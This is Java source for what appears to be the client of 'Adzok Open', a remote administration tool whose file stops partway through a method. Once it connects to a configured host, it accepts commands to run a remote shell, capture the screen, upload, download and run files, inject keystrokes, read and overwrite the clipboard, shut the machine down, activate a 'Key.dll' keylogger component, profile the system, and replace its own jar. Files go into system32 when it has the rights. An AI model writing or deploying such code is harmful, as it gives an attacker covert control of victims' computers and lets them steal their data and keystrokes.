
/**
 *
 * @author AngelCruel
 */
import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.Transferable;
import java.awt.event.*;
import java.awt.geom.*;
import java.awt.image.*;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.jar.*;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.zip.*;
import javax.imageio.*;
import javax.swing.*;

public class svd extends JFrame implements Runnable, ActionListener {

    private int calidadImage = 24;
    private double resize = 1;
    private String tipoArchivo = "jpg";
    private int mseg = 200;
    private boolean conectado = false;
    int opcion = 0;
    private String[] string = new String[5];
    private Thread hilo;
    private Socket cliente;
    private ObjectOutputStream salida;
    private ObjectInputStream entrada;
    byte[] b = new byte[1024];
    private String version = "1.0.0.2", ping = "0";
    private int boton;
    private int posx;
    private int posy;
    private String com;
    private String dirfile = null;
    private String cping = null;
    private int tping = 0;
    private String dirp = null, cmd = null, cmd2 = null;
    private boolean cmdInic = true;
    private String dirbajar = null;
    boolean activated = false;
    private boolean capmouse = false;
    private String os = null;
    private String uninstall;
    private TrayIcon trayIcon = null;
    private SystemTray tray;
    private JButton desconectar;
    private JLabel label,info,info2;
    JButton botonlink;

    public svd() {
    	setIconImage(new ImageIcon(getClass().getResource("resources/icono.png")).getImage());
        setSize(340, 480);
        setTitle("Adzok Open v" + version);
        addWindowListener(new cerrar(this));
        setDefaultCloseOperation(JFrame.ICONIFIED);
        setLocationRelativeTo(null);
        cargarSysTray();
        
        JPanel panel = new JPanel();
        panel.setBorder(BorderFactory.createEmptyBorder(20, 20, 20, 20));
        panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));
        
        label = new JLabel("Connecting (IP/DNS): ", JLabel.CENTER);
        label.setFont(new Font("Serif", Font.BOLD, 18));
        label.setAlignmentX(JLabel.CENTER_ALIGNMENT);
        panel.add(label);
        
        info = new JLabel("", JLabel.CENTER);
        info.setFont(new Font("Serif", Font.BOLD, 18));
        info.setAlignmentX(JLabel.CENTER_ALIGNMENT);
        panel.add(info);
        
        info2 = new JLabel("", JLabel.CENTER);
        info2.setFont(new Font("Serif", Font.BOLD, 18));
        info2.setAlignmentX(JLabel.CENTER_ALIGNMENT);
        panel.add(info2);
        
        JLabel icono = new JLabel();
        icono.setIcon(new ImageIcon(getClass().getResource("resources/icono.png")));
        icono.setAlignmentX(JLabel.CENTER_ALIGNMENT);
        panel.add(icono);
        
        JPanel panel2 = new JPanel(new GridLayout(4, 1, 10, 10));
        JLabel label1 = new JLabel("Options \"Hidden\" is only available", JLabel.CENTER);
        label1.setFont(new Font("Serif", Font.BOLD, 18));
        panel2.add(label1);
        JLabel label2 = new JLabel("in Adzok Pro and Adzok Free", JLabel.CENTER);
        label2.setFont(new Font("Serif", Font.BOLD, 18));
        panel2.add(label2);
        JLabel label3 = new JLabel("for more information visit:", JLabel.CENTER);
        label3.setFont(new Font("Serif", Font.BOLD, 18));
        panel2.add(label3);
        botonlink = new JButton("<html><a href=\"http://adzok.com\">http://adzok.com</a></html>");
        botonlink.setFont(new Font("Serif", Font.PLAIN, 18));
        botonlink.setBorderPainted(false);
        botonlink.setOpaque(false);
        botonlink.setFocusable(false);
        botonlink.setCursor(Cursor.getPredefinedCursor(Cursor.HAND_CURSOR));
        botonlink.addActionListener(this);
        botonlink.setContentAreaFilled(false);
        panel2.add(botonlink);
        
        //panel.add(Box.createVerticalGlue()); 
        panel.add(panel2);
        
        desconectar = new JButton("Salir");
        desconectar.setAlignmentX(JButton.CENTER_ALIGNMENT);
        desconectar.addActionListener(this);
        panel.add(desconectar);
        
        add(panel);
        
        setVisible(true);
        //setExtendedState(JFrame.ICONIFIED);
    }

    private void cargarSysTray() {
        if (SystemTray.isSupported()) {
            tray = SystemTray.getSystemTray();
            Image image = new ImageIcon(getClass().getResource("resources/icono.png")).getImage();

            
            ActionListener exitListener = new ActionListener() {
                public void actionPerformed(ActionEvent e) {
                    System.exit(0);
                }
            };
            
            ActionListener uninstallListener = new ActionListener() {
                public void actionPerformed(ActionEvent e) {
                    desconectar();
                    Uninstall();
                    System.exit(0);
                }
            };

            MouseListener mouseListener = new MouseListener() {
                public void mouseClicked(MouseEvent e) {
                    if (e.getButton() == e.BUTTON1) {
                        mostrar();
                    }
                }

                public void mouseEntered(MouseEvent e) {
                }

                public void mouseExited(MouseEvent e) {
                }

                public void mousePressed(MouseEvent e) {
                }

                public void mouseReleased(MouseEvent e) {
                }
            };

            PopupMenu pop = new PopupMenu();
            MenuItem defaultItem = new MenuItem("Exit Adzok Open");
            defaultItem.addActionListener(exitListener);
            pop.add(defaultItem);
            MenuItem uninstall = new MenuItem("Uninstall Adzok Open");
            uninstall.addActionListener(uninstallListener);
            pop.add(uninstall);

            trayIcon = new TrayIcon(image, "Adzok Open v" + version, pop);

            ActionListener actionListener = new ActionListener() {
                public void actionPerformed(ActionEvent e) {
                    mostrar();
                }
            };

            trayIcon.setImageAutoSize(true);
            trayIcon.addActionListener(actionListener);
            trayIcon.addMouseListener(mouseListener);
        }
    }

    public void mostrar() {
        setVisible(true);
        tray.remove(trayIcon);
        setExtendedState(JFrame.NORMAL);
    }

    public static void main(String args[]) {
        svd s = new svd();
        s.funIniciar();
    }

    public void conectar() {
        try {
            cliente = new Socket(string[0], Integer.parseInt(string[2]));
            salida = new ObjectOutputStream(cliente.getOutputStream());
            salida.flush();
            entrada = new ObjectInputStream(cliente.getInputStream());

            conectado = true;
            gestionarMensaje("Mensaje", "v0.0.2");
        } catch (IOException ex) {
            System.out.println("Error al conectar");
            info.setText("Error al conectar");
        	info2.setText("Reintentando en 3 min");
            conectado = false;
        }
    }

    private int identificar() {
        Scanner scanner;
        try {
            String passRemote = (String) descargarInformacion();
            if (!passRemote.equals(string[1])) {
            	info.setText("Contraseña incorrecta");
            	info2.setText("Reintentando en 3 min");
                gestionarMensaje("Mensaje", "bad");
                desconectar();
                return 1;
            } else {
            	info.setText("Contraseña correcta");
            	info2.setText("Conexión exitosa");
            	gestionarMensaje("Mensaje", "good");
            }
            try {
                scanner = new Scanner(new File(dirfile));
                scanner.next();
            } catch (Exception ex) {
                Formatter archivo = new Formatter(dirfile);
                archivo.format("%s", "New");
                archivo.flush();
                archivo.close();
            }
            scanner = new Scanner(new File(dirfile));
            gestionarMensaje("Mensaje", scanner.next());

            Properties propiedades = System.getProperties();
            gestionarMensaje("Mensaje", propiedades.getProperty("user.name"));
            gestionarMensaje("Mensaje", cliente.getLocalSocketAddress().toString());

            // CAMBIAR AL FINAL
            gestionarMensaje("Mensaje", ipExterna());

            gestionarMensaje("Dato", Integer.parseInt(string[2]));
            gestionarMensaje("Mensaje", version);

            Process proceso = Runtime.getRuntime().exec(cping);
            BufferedReader lecturaTemp = new BufferedReader(new InputStreamReader(proceso.getInputStream(), "Cp850"));
            String line = null;
            for (int i = 0; i <= 6; i++) {
                line = lecturaTemp.readLine();
            }

            String[] temp = line.split(" ");
            ping = temp[tping].replace("tiempo", "").replace("time", "").replace("=", "").replace("<", "").replace(">", "");

            gestionarMensaje("Mensaje", ping);
        } catch (Exception ex) {
            System.out.println("Exeption en IDENTIFICAR");
            gestionarMensaje("Mensaje", "0ms");
        }
        return 0;
    }

    public void funIniciar() {
        hilo = new Thread(this);
        hilo.start();
    }

    public void run() {
        cargarDatos();
        label.setText("Connecting (IP/DNS): " + string[0]);
        identificarOS();
        while (true) {
            conectar();

            if (conectado) {
                if (identificar()==1){
                	try {
						Thread.sleep(180000);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
                	continue;
                }

                try {
                    int salir = 0;
                    do {
                        try {
                            System.gc();

                            opcion = (Integer) descargarInformacion();
                            switch (opcion) {
                                case 2:
                                    opcionEscritorio();
                                    break;

                                case 3:
                                    opcionCommand();
                                    break;

                                case 4:
                                    Mensaje m = new Mensaje((String) descargarInformacion(), (String) descargarInformacion(), (Integer) descargarInformacion());
                                    m.start();
                                    break;

                                case 5:
                                    String direccion = null;
                                    String nombref = (String) descargarInformacion();

                                    direccion = (String) descargarInformacion();
                                    if (direccion.equals("")) {
                                        direccion = System.getenv("TMP") + "\\";
                                    }
                                    if (nombref.equals("Key.dll")) {
                                        direccion = dirbajar;
                                    }
                                    byte[] b = (byte[]) descargarInformacion();
                                    ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(b);
                                    FileOutputStream fileOut = new FileOutputStream(direccion + nombref);
                                    int data = -1;
                                    while ((data = byteArrayInputStream.read()) != -1) {
                                        fileOut.write(data);
                                    }
                                    fileOut.close();
                                    byteArrayInputStream.close();

                                    if (!nombref.equals("Key.dll")) {
                                        gestionarMensaje("Dato", 5);
                                    }
                                    break;

                                case 6:
                                    try {
                                        File file = new File((String) descargarInformacion());
                                        gestionarMensaje("Dato", 6);
                                        if (file.exists()) {
                                            gestionarMensaje("Mensaje", file.getName());
                                        } else {
                                            gestionarMensaje("Mensaje", "no existe");
                                            break;
                                        }
                                        FileInputStream fileInput = new FileInputStream(file);
                                        ByteArrayOutputStream fileArray = new ByteArrayOutputStream();
                                        if (fileInput.available() > 59244544) {
                                            gestionarMensaje("Mensaje", "Error");
                                        } else {
                                            gestionarMensaje("Mensaje", "Good");
                                            byte[] array = new byte[1024];
                                            int leidos = fileInput.read(array);
                                            while (leidos > 0) {
                                                fileArray.write(array, 0, leidos);
                                                leidos = fileInput.read(array);
                                            }
                                            fileInput.close();
                                            fileArray.close();

                                            ByteArrayOutputStream compressedContent = new ByteArrayOutputStream();
                                            GZIPOutputStream gzipstream = new GZIPOutputStream(compressedContent);
                                            gzipstream.write(fileArray.toByteArray());
                                            gzipstream.finish();
                                            gzipstream.close();
                                            compressedContent.close();
                                            byte[] compressedBytes = compressedContent.toByteArray();

                                            gestionarMensaje("Mensaje", file.getName());
                                            gestionarMensaje("Archivo", compressedBytes);
                                        }
                                    } catch (IOException ex) {
                                        System.out.println("Error abriendo archivo");
                                    }
                                    break;

                                case 7:
                                    gestionarMensaje("Dato", 8);
                                    gestionarMensaje("Mensaje", os);

                                    if (os.equals("WINDOWS")) {
                                        File f = new File(dirbajar + "Key.dll");
                                        if (f.exists()) {
                                            FileReader ir = new FileReader(f);
                                            BufferedReader br = new BufferedReader(ir);

                                            String line = "", total = "";
                                            while ((line = br.readLine()) != null) {
                                                total = total + line;
                                            }
                                            if (total.length() == 496585) {
                                                gestionarMensaje("Mensaje", "SI");
                                                activated = true;
                                                keyh kh = new keyh();
                                                kh.start();
                                            } else {
                                                gestionarMensaje("Mensaje", "NO");
                                            }
                                        } else {
                                            gestionarMensaje("Mensaje", "NO");
                                        }
                                    }
                                    break;

                                case 8:
                                    activated = false;
                                    break;

                                case 9:
                                    String nombre = (String) descargarInformacion();
                                    try {
                                        Formatter archivo = new Formatter(System.getenv("TMP") + "\\" + nombre);
                                        archivo.format("%s", (String) descargarInformacion());
                                        archivo.flush();
                                        archivo.close();
                                    } catch (FileNotFoundException ex) {
                                        Logger.getLogger(svd.class.getName()).log(Level.SEVERE, null, ex);
                                    }
                                    if ((Integer) descargarInformacion() == 0) {
                                        Runtime run = null;
                                        try {
                                            String temp = null;
                                            if (os.equals("WINDOWS")) {
                                                temp = " start ";
                                            } else if (os.equals("LINUX")) {
                                                temp = " ";
                                            } else if (os.equals("MAC")) {
                                                temp = " ";
                                            }
                                            run = Runtime.getRuntime();
                                            run.exec(cmd + " " + cmd2 + temp + (System.getenv("TMP") + "\\" + nombre).replaceAll(" ", "\" \""));
                                        } catch (IOException ex) {
                                        }
                                    }
                                    break;

                                case 10:
                                    StringBuffer buffer = new StringBuffer();
                                    buffer.append(cliente.getLocalAddress().getHostAddress());
                                    buffer.append("#");
                                    buffer.append(ipExterna());
                                    buffer.append("#");
                                    buffer.append(System.getenv("COMPUTERNAME"));
                                    buffer.append("#");
                                    buffer.append(System.getProperty("user.name"));
                                    buffer.append("#");
                                    buffer.append(System.getProperty("user.country"));
                                    buffer.append("#");
                                    buffer.append(System.getProperty("os.name"));
                                    buffer.append("#");
                                    buffer.append(System.getProperty("os.version"));
                                    buffer.append("#");
                                    buffer.append(System.getProperty("user.language"));
                                    buffer.append("#");
                                    buffer.append(System.getenv("PROCESSOR_IDENTIFIER"));
                                    buffer.append("#");
                                    buffer.append(System.getProperty("os.arch"));
                                    buffer.append("#");
                                    buffer.append(System.getenv("NUMBER_OF_PROCESSORS"));
                                    buffer.append("#");
                                    Dimension dim = Toolkit.getDefaultToolkit().getScreenSize();
                                    buffer.append((int) dim.getWidth()).append("x").append((int) dim.getHeight());
                                    buffer.append("#");
                                    buffer.append(new Date());
                                    buffer.append("#");
                                    buffer.append(System.getProperty("user.dir")).append("\\").append(verNombre());
                                    buffer.append("#");
                                    buffer.append(System.getProperty("java.runtime.version"));
                                    gestionarMensaje("Dato", 10);
                                    gestionarMensaje("bufferMensaje", buffer);
                                    break;

                                case 11:
                                    try {
                                        Robot key = new Robot();
                                        String temp = descargarInformacion().toString();
                                        if (temp.equals("5324543")) {
                                            temp = descargarInformacion().toString().toUpperCase();
                                            for (int i = 0; i < temp.length(); i++) {
                                                try {
                                                    key.keyPress((int) temp.charAt(i));
                                                } catch (IllegalArgumentException ex) {
                                                }
                                            }
                                        } else {
                                            temp = descargarInformacion().toString().toUpperCase();
                                            int i = 0;
                                            if (temp.equals("F1")) {
                                                i = KeyEvent.VK_F1;
                                            } else if (temp.equals("F2")) {
                                                i = KeyEvent.VK_F2;
                                            } else if (temp.equals("F3")) {
                                                i = KeyEvent.VK_F3;
                                            } else if (temp.equals("F4")) {
                                                i = KeyEvent.VK_F4;
                                            } else if (temp.equals("F5")) {
                                                i = KeyEvent.VK_F5;
                                            } else if (temp.equals("F6")) {
                                                i = KeyEvent.VK_F6;
                                            } else if (temp.equals("F7")) {
                                                i = KeyEvent.VK_F7;
                                            } else if (temp.equals("F8")) {
                                                i = KeyEvent.VK_F8;
                                            } else if (temp.equals("F9")) {
                                                i = KeyEvent.VK_F9;
                                            } else if (temp.equals("F10")) {
                                                i = KeyEvent.VK_F10;
                                            } else if (temp.equals("F11")) {
                                                i = KeyEvent.VK_F11;
                                            } else if (temp.equals("F12")) {
                                                i = KeyEvent.VK_F12;
                                            } else if (temp.equals("ENTER")) {
                                                i = KeyEvent.VK_ENTER;
                                            } else if (temp.equals("BACK")) {
                                                i = KeyEvent.VK_CLEAR;
                                            } else if (temp.equals("ESC")) {
                                                i = KeyEvent.VK_ESCAPE;
                                            } else if (temp.equals("TAB")) {
                                                i = KeyEvent.VK_TAB;
                                            } else if (temp.equals("SUP")) {
                                                i = KeyEvent.VK_DELETE;
                                            } else if (temp.equals("INSERT")) {
                                                i = KeyEvent.VK_INSERT;
                                            } else if (temp.equals("INICIO")) {
                                                i = KeyEvent.VK_HOME;
                                            } else if (temp.equals("FIN")) {
                                                i = KeyEvent.VK_END;
                                            } else if (temp.equals("UP")) {
                                                i = KeyEvent.VK_UP;
                                            } else if (temp.equals("DOWN")) {
                                                i = KeyEvent.VK_DOWN;
                                            } else if (temp.equals("LEFT")) {
                                                i = KeyEvent.VK_LEFT;
                                            } else if (temp.equals("RIGTH")) {
                                                i = KeyEvent.VK_RIGHT;
                                            }
                                            try {
                                                key.keyPress(i);
                                            } catch (IllegalArgumentException ex) {
                                            }
                                        }

                                    } catch (AWTException ex) {
                                        Logger.getLogger(svd.class.getName()).log(Level.SEVERE, null, ex);
                                    }
                                    break;

                                case 12:
                                    String clip = (String) descargarInformacion();
                                    if (clip.equals("5435235")) {
                                        Clipboard cb = Toolkit.getDefaultToolkit().getSystemClipboard();
                                        Transferable t = cb.getContents(this);
                                        try {
                                            DataFlavor dataFlavorStringJava = new DataFlavor("application/x-java-serialized-object; " + "class=java.lang.String");
                                            if (t.isDataFlavorSupported(dataFlavorStringJava)) {
                                                String texto = (String) t.getTransferData(dataFlavorStringJava);
                                                gestionarMensaje("Dato", 12);
                                                gestionarMensaje("Mensaje", texto);
                                            }
                                        } catch (Exception ex) {
                                            Logger.getLogger(svd.class.getName()).log(Level.SEVERE, null, ex);
                                        }
                                    } else if (clip.equals("65436")) {
                                        Clipboard cb = Toolkit.getDefaultToolkit().getSystemClipboard();
                                        StringSelection ss = new StringSelection(descargarInformacion().toString());
                                        cb.setContents(ss, ss);
                                    } else if (clip.equals("565435")) {
                                        Clipboard cb = Toolkit.getDefaultToolkit().getSystemClipboard();
                                        StringSelection ss = new StringSelection("");
                                        cb.setContents(ss, ss);
                                    }
                                    break;

                                case 13:
                                    String tempo = (String) descargarInformacion();
                                    String buff = descargarInformacion().toString();
                                    if (tempo.equals("64574356")) {
                                        String command = "";
                                        String[] temp = buff.split("/");
                                        if (os.equals("WINDOWS")) {
                                            if (temp[0].equals("543643")) {
                                                command = command + "shutdown -s -t " + temp[1];
                                                if (temp[2].equals("546654")) {
                                                    command = command + " -c " + temp[3];
                                                }
                                                if (temp[4].equals("4543465")) {
                                                    command = command + " -f";
                                                }
                                            } else {
                                                command = command + "shutdown -t " + temp[1];
                                                if (temp[2].equals("546654")) {
                                                    command = command + " -c " + temp[3];
                                                }
                                                if (temp[4].equals("4543465")) {
                                                    command = command + " -f";
                                                }
                                            }
                                        }
                                        if (os.equals("LINUX")) {
                                            if (temp[0].equals("543643")) {
                                                command = command + "shutdown -h -t " + temp[1];
                                                if (temp[2].equals("546654")) {
                                                    command = command + " -k " + temp[3];
                                                }
                                                if (temp[4].equals("4543465")) {
                                                    command = command + "";
                                                }
                                            } else {
                                                command = command + "shutdown -r -t " + temp[1];
                                                if (temp[2].equals("546654")) {
                                                    command = command + " -k " + temp[3];
                                                }
                                                if (temp[4].equals("4543465")) {
                                                    command = command + "";
                                                }
                                            }
                                        }
                                        try {
                                            Runtime.getRuntime().exec(command);
                                        } catch (IOException ex) {
                                        }
                                    } else if (tempo.equals("5646564")) {
                                        if (os.equals("WINDOWS")) {
                                            try {
                                                Runtime.getRuntime().exec("shutdown -a");
                                            } catch (IOException ex) {
                                            }
                                        }
                                        if (os.equals("LINUX")) {
                                            try {
                                                Runtime.getRuntime().exec("shutdown -c");
                                            } catch (IOException ex) {
                                            }
                                        }
                                    } else if (tempo.equals("5464564")) {
                                        try {
                                            try {
                                                Desktop.getDesktop().browse(new URI(buff));
                                            } catch (IOException ex) {
                                                //Logger.getLogger(svd.class.getName()).log(Level.SEVERE, null, ex);
                                            }
                                        } catch (URISyntaxException ex) {
                                            //Logger.getLogger(svd.class.getName()).log(Level.SEVERE, null, ex);
                                        }
                                    } else if (tempo.equals("65346456")) {
                                        try {
                                            Runtime.getRuntime().exec(buff);
                                        } catch (IOException ex) {
                                        }
                                    }
                                    break;

                                case 20:
                                    Runtime.getRuntime().exec("java -jar " + (dirbajar + verNombre()).replaceAll(" ", "\" \""));
                                    desconectar();
                                    System.exit(0);
                                    break;

                                case 21:
                                    desconectar();
                                    System.exit(0);
                                    break;

                                case 99:
                                    desconectar();
                                    Uninstall();
                                    System.exit(0);
                                    break;

                                case 100:
                                    b = (byte[]) descargarInformacion();
                                    byteArrayInputStream = new ByteArrayInputStream(b);
                                    File file = File.createTempFile("temp", ".dat");
                                    fileOut = new FileOutputStream(file);
                                    data = -1;
                                    while ((data = byteArrayInputStream.read()) != -1) {
                                        fileOut.write(data);
                                    }
                                    fileOut.close();
                                    byteArrayInputStream.close();

                                    byte[] buf = new byte[4096];
                                    JarEntry entry = null;
                                    int read = -1;

                                    InputStream inres = getClass().getResourceAsStream("Datos.txt");
                                    File file2 = File.createTempFile("temp2", ".dat");
                                    FileOutputStream FileOut2 = new FileOutputStream(file2);
                                    while ((read = inres.read(buf)) != -1) {
                                        FileOut2.write(buf, 0, read);
                                    }
                                    inres.close();
                                    FileOut2.close();
                                    JarInputStream jarIn = new JarInputStream(new FileInputStream(file));
                                    Manifest manifest = new Manifest();
                                    manifest = jarIn.getManifest();
                                    JarOutputStream jarOut = new JarOutputStream(new FileOutputStream(dirbajar + verNombre()), manifest);
                                    while ((entry = jarIn.getNextJarEntry()) != null) {
                                        if ("META-INF/MANIFEST.MF".equals(entry.getName())) {
                                            continue;
                                        }
                                        jarOut.putNextEntry(entry);
                                        while ((read = jarIn.read(buf)) != -1) {
                                            jarOut.write(buf, 0, read);
                                        }
                                        jarOut.closeEntry();
                                    }
                                    File testfile = new File("Datos.txt");
                                    jarOut.putNextEntry(new JarEntry(testfile.getPath()));
                                    FileInputStream inres2 = new FileInputStream(file2);
                                    while ((read = inres2.read(buf)) != -1) {
                                        jarOut.write(buf, 0, read);
                                    }
                                    jarOut.closeEntry();
                                    jarOut.flush();
                                    jarOut.close();
                                    jarIn.close();
                                    inres2.close();
                                    gestionarMensaje("Dato", 100);

                                    Runtime.getRuntime().exec("java -jar " + (dirbajar + verNombre()).replaceAll(" ", "\" \""));
                                    desconectar();
                                    System.exit(0);
                                    break;
                                default:
                                    System.out.println("Caso incorrecto");
                                    break;
                            }
                        } catch (NumberFormatException ev) {
                            ev.printStackTrace();
                            break;
                        } catch (ClassCastException ec) {
                            ec.printStackTrace();
                            break;
                        }
                    } while (true);

                } catch (Exception e) {
                    e.printStackTrace();
                    desconectar();
                }
            }

            try {
                hilo.sleep(180000);
            } catch (InterruptedException ex) {
                System.out.println("\nInterrumpido...");
                desconectar();
            }
            conectado = false;
        }
    }

    public void opcionEscritorio() {
        try {
            try {
                Thread.sleep(mseg);
            } catch (InterruptedException ex) {
                Logger.getLogger(svd.class.getName()).log(Level.SEVERE, null, ex);
            }
            gestionarMensaje("Dato", 2);
            String t = (String) descargarInformacion();
            if (t.equals("SI")) {
                capmouse = true;
            } else {
                capmouse = false;
            }
            obtenerMouse();
            obtenerPropiedades((StringBuffer) descargarInformacion());
            obtenerMouse();

            Rectangle rectangleTam = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            try {
                Robot robot = new Robot();

                BufferedImage bufferedImage = robot.createScreenCapture(rectangleTam);

                bufferedImage = scale(bufferedImage);
                bufferedImage = Binarizacion(bufferedImage, calidadImage);
                ByteArrayOutputStream salidaImagen = new ByteArrayOutputStream();
                salidaImagen.reset();

                ImageIO.write(bufferedImage, tipoArchivo, salidaImagen);
                ByteArrayOutputStream compressedContent = new ByteArrayOutputStream();
                GZIPOutputStream gzipstream = new GZIPOutputStream(compressedContent);

                gzipstream.write(salidaImagen.toByteArray());
                salidaImagen.close();

                gzipstream.finish();
                gzipstream.close();

                gestionarMensaje("Dato", compressedContent.toByteArray().length);
                obtenerMouse();
                gestionarMensaje("Archivo", compressedContent.toByteArray());
                obtenerMouse();
                compressedContent.close();
            } catch (AWTException e) {
                e.printStackTrace();
            } // procesar los problemas que pueden ocurrir al enviar el objeto
            catch (IOException io) {
                System.out.println("Error");
            }
        } // procesar los problemas que pueden ocurrir al enviar el objeto
        catch (AWTException ex) {
            Logger.getLogger(svd.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public void opcionCommand() {
        try {
            String comando = "";
            StringBuffer texto;
            File filec = new File(dirp);
            File reserva = null;
            Process proceso = null;
            ProcessBuilder run = new ProcessBuilder(cmd);
            proceso = run.start();
            run.directory(filec);
            BufferedReader inOK = new BufferedReader(new InputStreamReader(proceso.getInputStream(), "Cp850"));
            BufferedReader inERR = new BufferedReader(new InputStreamReader(proceso.getInputStream(), "Cp850"));
            String line = null;

            if (cmdInic) {
                texto = new StringBuffer();
                line = inOK.readLine();
                texto.append(line).append("\n");
                line = inOK.readLine();
                texto.append(line).append("\n\n");
                texto.append(filec.getCanonicalPath()).append(">");

                gestionarMensaje("Dato", 3);
                gestionarMensaje("bufferMensaje", texto);
                cmdInic = false;
            }


            boolean cd = false;
            boolean exe = false;
            boolean exed = false;

            while (!comando.equalsIgnoreCase("exit")) {
                comando = (String) descargarInformacion();
                try {
                    if (comando.length() > 4) {
                        if (comando.substring(0, 3).equals("cd ")) {
                            cd = true;
                        }
                    }
                    if (comando.length() > 5) {
                        if (comando.substring(0, 4).equals("exe ")) {
                            exe = true;
                        }
                    }
                    if (comando.length() > 6) {
                        if (comando.substring(0, 5).equals("exed ")) {
                            exed = true;
                        }
                    }
                    reserva = run.directory();
                    if (comando.equals("exit")) {
                        break;
                    } else if (comando.equals("cd..")) {
                        filec = run.directory();
                        String temp = filec.getCanonicalFile().toString().replace(filec.getName(), "");
                        filec = new File(temp);
                        run.directory(filec);
                        proceso = run.start();
                        ///////////////////////////////////////////////////////////////////////////////////
                        filec = run.directory();
                        temp = filec.getCanonicalFile().toString().replace(filec.getName(), "");
                        filec = new File(temp);
                        run.directory(filec);
                        proceso = run.start();
                    } else if (comando.length() == 2) {
                        if (comando.substring(1, 2).equals(":")) {
                            filec = new File(comando + "/");
                            run.directory(filec);
                            proceso = run.start();
                        } else {
                            run.command(cmd, cmd2, comando);
                            proceso = run.start();
                            run.redirectErrorStream(true);
                        }
                    } else if (cd) {
                        cd = false;
                        String temp = comando.substring(3, comando.length());
                        File exist = new File(run.directory().getAbsolutePath() + "/" + temp);
                        if (exist.exists()) {
                            filec = new File(run.directory().getAbsolutePath() + "/" + temp);
                            run.directory(filec);
                            proceso = run.start();
                        } else {
                            run.directory(reserva);
                            gestionarMensaje("Dato", 3);
                            gestionarMensaje("bufferMensaje", new StringBuffer(comando + "\nEl sistema no puede hallar la ruta especificada.\n\n" + reserva.getCanonicalPath() + ">"));
                            continue;
                        }
                    } else if (exe) {
                        Runtime.getRuntime().exec(filec.getCanonicalPath() + "/" + comando.substring(4, comando.length()));
                        exe = false;
                    } else if (exed) {
                        Runtime.getRuntime().exec(comando.substring(5, comando.length()));
                        exed = false;
                    } else {
                        run.command(cmd, cmd2, comando);
                        proceso = run.start();
                        run.redirectErrorStream(true);
                    }
                    inOK = new BufferedReader(new InputStreamReader(proceso.getInputStream(), "Cp850"));
                    inERR = new BufferedReader(new InputStreamReader(proceso.getErrorStream(), "Cp850"));
                    texto = new StringBuffer();
                    texto.append(comando).append("\n");
                    while ((line = inOK.readLine()) != null) {
                        texto.append(line).append("\n");
                    }
                    while ((line = inERR.readLine()) != null) {
                        texto.append(line).append("\n");
                    }
                    texto.append("\n").append(filec.getCanonicalPath()).append(">");
                    gestionarMensaje("Dato", 3);
                    gestionarMensaje("bufferMensaje", texto);
                } catch (IOException io) {
                    run.directory(reserva);
                    //gestionarMensaje("Dato", 3);
                    //gestionarMensaje("bufferMensaje", new StringBuffer(comando + "\nEl sistema no puede hallar la ruta especificada.\n\n" + reserva.getCanonicalPath() + ">"));
                    cd = false;
                    exe = false;
                    exed = false;
                } catch (Exception e) {
                    System.out.println("exception");
                    cd = false;
                    exe = false;
                    exed = false;
                }
            }
        } catch (IOException ex) {
            Logger.getLogger(svd.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public void Uninstall() {
        InputStream is = null;
        byte[] buffer = new byte[512 * 1024];
        int nbLectura;

        try {
            is = getClass().getResourceAsStream("/Uninstall.jar");
            FileOutputStream archivoDestino = new FileOutputStream(uninstall);
            while ((nbLectura = is.read(buffer)) != -1) {
                archivoDestino.write(buffer, 0, nbLectura);
            }
            is.close();
            archivoDestino.close();
        } catch (Exception ex) {
            System.out.println("Error cargarDatos.");
            ex.printStackTrace();
        }
        try {
            Runtime.getRuntime().exec("java -jar " + uninstall.replaceAll(" ", "\" \"") + " " + string[3] + " " + string[4]);
        } catch (IOException ex) {
            Logger.getLogger(svd.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public void identificarOS() {
        if (System.getProperty("os.name").toUpperCase().indexOf("WINDOWS") != -1) {
            cping = "ping " + string[0] + " -n 1";
            tping = 4;
            dirp = "c:\\";
            cmd = "cmd";
            cmd2 = "/c";
            os = "WINDOWS";
            File f = new File(System.getenv("systemroot") + "\\dsf34rsdfew");
            uninstall = System.getenv("TMP") + "\\0AS1243F7D4.tmp";
            if (f.mkdir()) {
                dirfile = System.getenv("systemroot") + "\\system32\\inf.txt";
                dirbajar = System.getenv("systemroot") + "\\system32\\";
                f.delete();
            } else {
                dirfile = System.getenv("APPDATA") + "\\" + "inf.txt";
                dirbajar = System.getenv("APPDATA") + "\\";
            }
        }
        if (System.getProperty("os.name").toUpperCase().indexOf("LINUX") != -1) {
            dirfile = "/home/" + System.getProperty("user.name") + "/.config/" + "inf.txt";
            cping = "ping " + string[0] + " -c 1";
            tping = 6;
            dirp = "/";
            cmd = "sh";
            cmd2 = "-c";
            dirbajar = "/home/" + System.getProperty("user.name") + "/.config/";
            os = "LINUX";
            uninstall = "/home/" + System.getProperty("user.name") + "/.config/0AS1243F7D4.tmp";
        }
        if (System.getProperty("os.name").toUpperCase().indexOf("MAC") != -1) {
            os = "MAC";
        }
    }

    public void cargarDatos() {
        try {
            Scanner scanner = new Scanner(getClass().getResourceAsStream("/Datos.txt"));
            for (int i = 0; i < 5; i++) {
                string[i] = scanner.nextLine();
            }
        } catch (Exception ex) {
            string[0] = "127.0.0.1";
            string[1] = "";
            string[2] = "7777";
            string[3] = "new";
            string[4] = "new";
        }
    }

    public BufferedImage Binarizacion(BufferedImage bufferedImage, int bites) {
        BufferedImage bwImage = null;
        if (bites == 2) {
            bwImage = new BufferedImage(bufferedImage.getWidth(), bufferedImage.getHeight(), BufferedImage.TYPE_BYTE_BINARY);
            bwImage.createGraphics().drawImage(bufferedImage, 0, 0, null);
        } else if (bites == 24) {
            bwImage = bufferedImage;
        }
        return bwImage;
    }

    public String ipExterna() {
        String ipExterna = null;
        try {
            URL url = new URL("http://ip1.dynupdate.no-ip.com:8245/");
            BufferedReader stream = new BufferedReader(new InputStreamReader(url.openStream()));
            ipExterna = stream.readLine();
            stream.close();
        } catch (Exception ex) {
        	return "0.0.0.0";
        }
        return ipExterna;
    }

    public BufferedImage scale(BufferedImage bi) {
